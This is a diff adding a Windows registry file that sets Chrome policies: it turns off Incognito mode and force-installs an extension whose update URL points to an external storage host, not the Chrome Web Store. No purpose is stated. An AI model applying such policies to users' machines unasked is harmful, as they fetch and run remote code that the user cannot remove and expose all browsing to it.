@@ -1,0 +1,12 @@
+```reg
+Windows Registry Editor Version 5.00
+
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome]
+
+; Disable Incognito
+"IncognitoModeAvailability"=dword:00000001
+
+; Force install extension
+[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist]
+"1"="ppcnammmjmibaigjoofiaploannfoeno;https://storage.hatbuinho.me/public/share/f2X9z5Qb1lswmE3GyzEY6A/update.xml"
+```
